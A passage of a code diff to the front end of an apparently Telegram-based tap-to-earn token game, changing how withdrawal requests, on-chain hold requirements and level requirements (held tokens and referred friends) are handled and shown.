+          onChainTT: state.onChainTT
+        })
+      });
+      const out = await res.json();
+      if (!out.ok) return showToast("⚠️ Failed to submit request");
+
+      state.appBalance -= amt;
+      state.activities.unshift({
+        title: `Withdraw Request (${amt} TT)`,
+        date: new Date().toLocaleDateString(),
+        amount: `-${amt.toFixed(2)} TT`
+      });
+      saveState();
+      renderAll();
+      window.closeModal("withdrawModal");
+      showToast("🚀 Withdrawal request sent to Admin!");
+    } catch (e) {
+      showToast("⚠️ Network error, please retry");
+    }
   };
 
   function getInviteUrl() { return `https://t.me/${CONFIG.BOT_USERNAME}?start=ref_${tgUser.id}`; }
@@ -1226,8 +1388,7 @@
     document.getElementById("gridLeague").textContent = getLeagueName(state.level);
     document.getElementById("gridLeagueSub").textContent = `Lv.${state.level} • Tap for 1-100`;
 
-    const targetWithdraw = Math.max(CONFIG.MIN_WITHDRAW, state.appBalance);
-    const reqHold = targetWithdraw * CONFIG.HOLD_PERCENT_REQUIRED;
+    const reqHold = CONFIG.MIN_WITHDRAW * CONFIG.HOLD_PERCENT_REQUIRED;
     document.getElementById("requiredHoldTT").textContent = reqHold.toFixed(2);
     const holdBadge = document.getElementById("holdStatusBadge");
     if (state.onChainTT >= reqHold) {
@@ -1258,7 +1419,7 @@
       document.getElementById("walletStatusDot").className = "w-2 h-2 rounded-full bg-emerald-400";
       document.getElementById("walletStatusText").textContent = "Wallet • Connected";
       document.getElementById("shortWalletAddr").textContent = state.walletAddress.slice(0, 5) + "..." + state.walletAddress.slice(-4);
-      document.getElementById("swapActionBtn").textContent = "⇅ Buy / Switch TT Now";
+      document.getElementById("swapActionBtn").textContent = "⇅ Direct Switch Now";
     }
     document.getElementById("onChainTTBalance").textContent = state.onChainTT.toFixed(4);
     document.getElementById("onChainTonBalance").textContent = state.tonBalance.toFixed(2);
@@ -1289,7 +1450,7 @@
       <div class="p-3 rounded-2xl border ${l.lv === state.level ? 'gold-card-highlight' : 'bg-white/5 border-white/10'} flex justify-between items-center text-xs">
         <div>
           <div class="font-extrabold text-white">Lv.${l.lv} • ${l.name}</div>
-          <div class="text-zinc-400">Hold ${l.holdReq.toLocaleString()} TT OR ${l.refReq} Verified Friends</div>
+          <div class="text-zinc-400">Hold ${l.holdReq.toLocaleString()} TT <b class="text-amber-400">AND</b> ${l.refReq} Verified Friends</div>
         </div>
         <div class="text-right">
           <div class="font-extrabold text-amber-400">${l.daily} TT/d</div>
